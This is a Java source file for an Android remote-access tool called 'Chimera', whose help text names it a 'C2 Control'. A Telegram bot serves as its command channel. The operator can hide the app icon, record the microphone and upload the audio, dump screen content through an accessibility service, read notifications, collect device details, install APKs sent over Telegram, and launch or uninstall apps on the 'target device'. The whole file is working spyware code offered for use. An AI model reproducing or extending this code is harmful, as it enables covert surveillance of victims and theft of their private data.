package com.chimera;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.media.AudioManager;
import android.net.Uri;
import android.provider.Settings;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;

public class TelegramBotWorker implements Runnable {
    private final Context context;
    private long lastUpdateId = 0;

    private enum WaitingState { NONE, FOR_PACKAGE_NAME_LAUNCH, FOR_PACKAGE_NAME_UNINSTALL, FOR_VOLUME, FOR_IMAGE_OVERLAY, FOR_APK_INSTALL }
    private WaitingState currentState = WaitingState.NONE;

    public TelegramBotWorker(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public void run() {
        while (!Thread.currentThread().isInterrupted()) {
            try {
                pollForUpdates();
                Thread.sleep(3000);
            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
                break;
            } catch (Exception e) {
                ErrorLogger.logError(context, "TelegramBotWorker_RunLoop", e);
            }
        }
    }

    private void pollForUpdates() {
        HttpURLConnection conn = null;
        try {
            String token = ConfigLoader.getBotToken();
            long adminId = ConfigLoader.getAdminId();
            if (token == null || adminId == 0) return;
            String urlStr = "https://api.telegram.org/bot" + token + "/getUpdates?timeout=20&allowed_updates=[\"message\",\"callback_query\"]";
            if (lastUpdateId > 0) urlStr += "&offset=" + (lastUpdateId + 1);
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(25000);
            conn.setReadTimeout(25000);
            if (conn.getResponseCode() != HttpURLConnection.HTTP_OK) return;

            InputStream is = conn.getInputStream();
            String responseStr = streamToString(is);
            is.close();

            JSONObject responseJson = new JSONObject(responseStr);
            if (!responseJson.getBoolean("ok")) return;

            JSONArray updates = responseJson.getJSONArray("result");
            for (int i = 0; i < updates.length(); i++) {
                JSONObject update = updates.getJSONObject(i);
                lastUpdateId = update.getLong("update_id");
                if (update.has("message")) {
                    handleMessage(update.getJSONObject("message"));
                } else if (update.has("callback_query")) {
                    handleCallback(update.getJSONObject("callback_query"));
                }
            }
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_Poll", e);
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private void handleMessage(JSONObject msg) {
        try {
            if (msg.getJSONObject("chat").getLong("id") != ConfigLoader.getAdminId()) return;

            if (msg.has("document") || msg.has("photo")) {
                handleFileUpload(msg);
                return;
            }

            if (!msg.has("text")) return;
            String text = msg.getString("text").trim();

            if (handleStatefulReply(text)) return;

            String[] parts = text.split(" ");
            String command = parts[0].toLowerCase();

            switch (command) {
                case "/start": case "/help":
                    sendHelpMessage();
                    break;
                case "/control":
                    sendControlPanel();
                    break;
                case "/toggle_app_hide":
                    StealthHandler.setComponentState(context, false);
                    sendMessage("App icon is now hidden.", context);
                    break;
                case "/toggle_app_show":
                    StealthHandler.setComponentState(context, true);
                    sendMessage("App icon is now visible.", context);
                    break;
                case "/grant_usage_access":
                    Intent usageIntent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                    usageIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(usageIntent);
                    sendMessage("Usage Access settings opened on target device.", context);
                    break;
                case "/mic":
                    int duration = 30;
                    if (parts.length > 1) {
                        try {
                            duration = Integer.parseInt(parts[1]);
                        } catch (NumberFormatException ignored) {}
                    }
                    final int finalDuration = duration;
                    sendMessage("Recording " + finalDuration + " seconds of audio...", context);
                    AudioHandler.startRecording(context, finalDuration, new AudioHandler.AudioCallback() {
                        @Override
                        public void onRecordingFinished(String filePath) { uploadAudio(filePath, ConfigLoader.getAdminId(), finalDuration + "s Audio", context); }
                        @Override
                        public void onError(String error) { sendMessage("Audio Error: " + error, context); }
                    });
                    break;
                case "/device_details":
                    sendMessage("Gathering device intelligence...", context);
                    DeviceDetailsHelper.getDeviceDetails(context, details -> sendMessage(details, context));
                    break;
            }
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_HandleMessage", e);
        }
    }

    private boolean handleStatefulReply(String text) {
        WaitingState previousState = currentState;
        currentState = WaitingState.NONE;

        switch (previousState) {
            case FOR_PACKAGE_NAME_LAUNCH:
                launchApp(text);
                return true;
            case FOR_PACKAGE_NAME_UNINSTALL:
                uninstallApp(text);
                return true;
            case FOR_VOLUME:
                setVolume(text);
                return true;
            default:
                currentState = previousState;
                return false;
        }
    }
    
    private void handleFileUpload(JSONObject msg) {
        WaitingState previousState = currentState;
        currentState = WaitingState.NONE;

        try {
            String fileId;
            String fileName;

            if (msg.has("document")) {
                fileId = msg.getJSONObject("document").getString("file_id");
                fileName = msg.getJSONObject("document").getString("file_name");
            } else if (msg.has("photo")) {
                JSONArray photoSizes = msg.getJSONArray("photo");
                fileId = photoSizes.getJSONObject(photoSizes.length() - 1).getString("file_id");
                fileName = fileId + ".jpg";
            } else {
                return;
            }
            
            switch (previousState) {
                case FOR_IMAGE_OVERLAY:
                    downloadFile(fileId, fileName, path -> {
                        Intent intent = new Intent(context, OverlayService.class);
                        intent.setAction("ACTION_SHOW_IMAGE");
                        intent.putExtra("imagePath", path);
                        context.startService(intent);
                        sendMessage("Displaying image overlay...", context);
                    });
                    break;
                case FOR_APK_INSTALL:
                    if (fileName.toLowerCase().endsWith(".apk")) {
                        downloadFile(fileId, fileName, this::installApp);
                    } else {
                        sendMessage("Error: The uploaded file is not an APK.", context);
                    }
                    break;
                default:
                    sendMessage("Received a file, but I don't know what to do with it.", context);
                    break;
            }
        } catch (Exception e) {
             ErrorLogger.logError(context, "HandleFileUpload_JSONError", e);
        }
    }

    private void handleCallback(JSONObject cb) {
        try {
            String data = cb.getString("data");

            if (!ChimeraAccessibilityService.isServiceEnabled() && data.startsWith("ACC_")) {
                sendMessage("⚠️ Action Failed: Accessibility Service is not enabled.", context);
                return;
            }
             if (!NotificationListener.isServiceEnabled() && data.startsWith("NOTIF_")) {
                sendMessage("⚠️ Action Failed: Notification Listener service is not enabled.", context);
                return;
            }

            switch (data) {
                case "LIST_APPS":
                    listAllApps();
                    break;
                case "LAUNCH_APP":
                    currentState = WaitingState.FOR_PACKAGE_NAME_LAUNCH;
                    sendMessage("Reply with the package name of the app to launch.", context);
                    break;
                 case "UNINSTALL_APP":
                    currentState = WaitingState.FOR_PACKAGE_NAME_UNINSTALL;
                    sendMessage("Reply with the package name of the app to uninstall.", context);
                    break;
                case "SET_VOLUME":
                    currentState = WaitingState.FOR_VOLUME;
                    sendMessage("Reply with a volume level from 0 to 100.", context);
                    break;
                case "SHOW_IMAGE":
                    currentState = WaitingState.FOR_IMAGE_OVERLAY;
                    Intent overlayIntent = new Intent(context, OverlayActivity.class);
                    overlayIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(overlayIntent);
                    sendMessage("Upload the image file to display.", context);
                    break;
                case "INSTALL_APP":
                    currentState = WaitingState.FOR_APK_INSTALL;
                    sendMessage("Upload the APK file to install.", context);
                    break;
                case "NOTIF_GET_EXISTING":
                    NotificationListener.getActiveNotifications(context);
                    break;
                case "ACC_GET_CONTENT":
                    sendMessage("Dumping screen content...", context);
                    sendMessage(ChimeraAccessibilityService.getScreenContent(), context);
                    break;
                case "EXIT_PANEL":
                    break;
            }
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_HandleCallback", e);
        }
    }

    private void launchApp(String packageName) {
        PackageManager pm = context.getPackageManager();
        try {
            Intent intent = pm.getLaunchIntentForPackage(packageName);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                sendMessage("App launch requested: " + packageName, context);
            } else {
                sendMessage("Error: Could not launch " + packageName, context);
            }
        } catch (Exception e) {
            sendMessage("Error launching app: " + e.getMessage(), context);
        }
    }

    private void uninstallApp(String packageName) {
        Intent intent = new Intent(Intent.ACTION_DELETE);
        intent.setData(Uri.parse("package:" + packageName));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        sendMessage("Uninstall requested for " + packageName + ". User confirmation may be required.", context);
    }
    
    private void installApp(String apkPath) {
        File apkFile = new File(apkPath);
        if (!apkFile.exists()) {
            sendMessage("Error: APK file not found.", context);
            return;
        }
        Intent intent = new Intent(Intent.ACTION_VIEW);
        Uri fileUri = Uri.fromFile(apkFile);
        intent.setDataAndType(fileUri, "application/vnd.android.package-archive");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
        context.startActivity(intent);
        sendMessage("Install requested for " + apkFile.getName() + ". User confirmation is required.", context);
    }

    private void setVolume(String levelStr) {
        try {
            int level = Integer.parseInt(levelStr);
            if (level < 0 || level > 100) {
                sendMessage("Error: Volume must be between 0 and 100.", context);
                return;
            }
            AudioManager am = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
            int maxVolume = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
            int targetVolume = (int) (maxVolume * (level / 100.0));
            am.setStreamVolume(AudioManager.STREAM_MUSIC, targetVolume, 0);
            sendMessage("Media volume set to " + level + "%.", context);
        } catch (NumberFormatException e) {
            sendMessage("Error: Invalid number provided.", context);
        }
    }
    
    private void listAllApps() {
        new Thread(() -> {
            PackageManager pm = context.getPackageManager();
            List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            StringBuilder appList = new StringBuilder();
            int userAppCount = 0;
            for (ApplicationInfo app : packages) {
                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    appList.append(app.packageName).append("\n");
                    userAppCount++;
                }
            }
            sendMessage("--- " + userAppCount + " User-Installed Apps ---\n" + appList.toString(), context);
        }).start();
    }
    
    private void sendHelpMessage() {
        String helpText = "Chimera C2 Control\n\n"
                + "/control - Show the main control panel.\n"
                + "/mic <seconds> - Record audio.\n"
                + "/device_details - Get device intel report.\n"
                + "/toggle_app_hide - Hide app icon.\n"
                + "/toggle_app_show - Show app icon.\n"
                + "/grant_usage_access - Open Usage Access settings.\n"
                + "/help - Show this message.";
        sendMessage(helpText, context);
    }

    private void sendControlPanel() {
        try {
            JSONObject keyboard = new JSONObject();
            JSONArray rows = new JSONArray();
            rows.put(new JSONArray()
                .put(new JSONObject().put("text", "List Apps").put("callback_data", "LIST_APPS"))
                .put(new JSONObject().put("text", "Launch App").put("callback_data", "LAUNCH_APP"))
                .put(new JSONObject().put("text", "Uninstall App").put("callback_data", "UNINSTALL_APP"))
            );
             rows.put(new JSONArray()
                .put(new JSONObject().put("text", "Install App (APK)").put("callback_data", "INSTALL_APP"))
                .put(new JSONObject().put("text", "Set Volume").put("callback_data", "SET_VOLUME"))
            );
            rows.put(new JSONArray()
                .put(new JSONObject().put("text", "Get Screen Content").put("callback_data", "ACC_GET_CONTENT"))
                .put(new JSONObject().put("text", "Get Active Notifications").put("callback_data", "NOTIF_GET_EXISTING"))
            );
             rows.put(new JSONArray()
                .put(new JSONObject().put("text", "Show Image Overlay").put("callback_data", "SHOW_IMAGE"))
            );
            keyboard.put("inline_keyboard", rows);
            sendMessageWithMarkup("Chimera Control Panel", keyboard);
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_SendControlPanel", e);
        }
    }

    private void downloadFile(String fileId, String fileName, FileDownloadCallback callback) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                String token = ConfigLoader.getBotToken();
                String getPathUrl = "https://api.telegram.org/bot" + token + "/getFile?file_id=" + fileId;
                
                URL url = new URL(getPathUrl);
                conn = (HttpURLConnection) url.openConnection();
                InputStream is = conn.getInputStream();
                String response = streamToString(is);
                is.close();
                conn.disconnect();
                
                JSONObject pathResponse = new JSONObject(response);
                String filePath = pathResponse.getJSONObject("result").getString("file_path");

                String downloadUrl = "https://api.telegram.org/file/bot" + token + "/" + filePath;
                File outputFile = new File(context.getCacheDir(), fileName);

                url = new URL(downloadUrl);
                conn = (HttpURLConnection) url.openConnection();
                is = conn.getInputStream();
                try (FileOutputStream fos = new FileOutputStream(outputFile)) {
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while ((bytesRead = is.read(buffer)) != -1) {
                        fos.write(buffer, 0, bytesRead);
                    }
                }
                is.close();
                
                callback.onFileDownloaded(outputFile.getAbsolutePath());

            } catch (Exception e) {
                ErrorLogger.logError(context, "FileDownloadError", e);
                sendMessage("Failed to download the file.", context);
            } finally {
                if (conn != null) conn.disconnect();
            }
        }).start();
    }
    
    private interface FileDownloadCallback {
        void onFileDownloaded(String path);
    }
    
    private static String streamToString(InputStream is) throws Exception {
        ByteArrayOutputStream result = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int length;
        while ((length = is.read(buffer)) != -1) {
            result.write(buffer, 0, length);
        }
        return result.toString("UTF-8");
    }

    private void sendMessageWithMarkup(String text, JSONObject markup) {
        try {
            JSONObject body = new JSONObject();
            body.put("chat_id", ConfigLoader.getAdminId());
            body.put("text", text);
            body.put("reply_markup", markup);
            post(body.toString(), context);
        } catch (Exception e) {
            ErrorLogger.logError(context, "SendMessageWithMarkup", e);
        }
    }
    
    public static void sendMessage(String message, Context context) {
        try {
            JSONObject body = new JSONObject();
            body.put("chat_id", ConfigLoader.getAdminId());
            body.put("text", message);
            post(body.toString(), context);
        } catch (Exception e) {
            ErrorLogger.logError(context, "SendMessageHelper", e);
        }
    }
    
    public static void post(String jsonBody, Context context) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                URL url = new URL("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage");
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(jsonBody.getBytes(StandardCharsets.UTF_8));
                }
                conn.getInputStream().close();
            } catch (Exception e) {
                ErrorLogger.logError(context, "TelegramBotWorker_Post", e);
            } finally {
                if (conn != null) conn.disconnect();
            }
        }).start();
    }

    public static void uploadAudio(String filePath, long chatId, String caption, Context context) {
        uploadMultipart(filePath, chatId, caption, context, "sendAudio", "audio", "audio/mp4");
    }

    private static void uploadMultipart(String filePath, long chatId, String caption, Context context, String endpoint, String fieldName, String contentType) {
        final File fileToUpload = new File(filePath);
        if (!fileToUpload.exists()) return;
        new Thread(() -> {
            String token = ConfigLoader.getBotToken();
            if (token == null) return;
            String urlStr = "https://api.telegram.org/bot" + token + "/" + endpoint;
            String boundary = "Boundary-" + System.currentTimeMillis();
            String LINE_FEED = "\r\n";
            HttpURLConnection conn = null;
            try {
                URL url = new URL(urlStr);
                conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setConnectTimeout(60000);
                conn.setReadTimeout(60000);
                try (OutputStream os = conn.getOutputStream(); PrintWriter writer = new PrintWriter(os, true)) {
                    writer.append("--" + boundary).append(LINE_FEED);
                    writer.append("Content-Disposition: form-data; name=\"chat_id\"").append(LINE_FEED).append(LINE_FEED).append(String.valueOf(chatId)).append(LINE_FEED);
                    writer.append("--" + boundary).append(LINE_FEED);
                    writer.append("Content-Disposition: form-data; name=\"caption\"").append(LINE_FEED).append(LINE_FEED).append(caption).append(LINE_FEED);
                    writer.append("--" + boundary).append(LINE_FEED);
                    writer.append("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + fileToUpload.getName() + "\"").append(LINE_FEED);
                    writer.append("Content-Type: " + contentType).append(LINE_FEED).append(LINE_FEED);
                    writer.flush();
                    try (FileInputStream fis = new FileInputStream(fileToUpload)) {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = fis.read(buffer)) != -1) {
                            os.write(buffer, 0, bytesRead);
                        }
                        os.flush();
                    }
                    writer.append(LINE_FEED).flush();
                    writer.append("--" + boundary + "--").append(LINE_FEED);
                }
                conn.getInputStream().close();
            } catch (Exception e) {
                ErrorLogger.logError(context, "TelegramBotWorker_Upload", e);
            } finally {
                if (conn != null) conn.disconnect();
                fileToUpload.delete();
            }
        }).start();
    }
}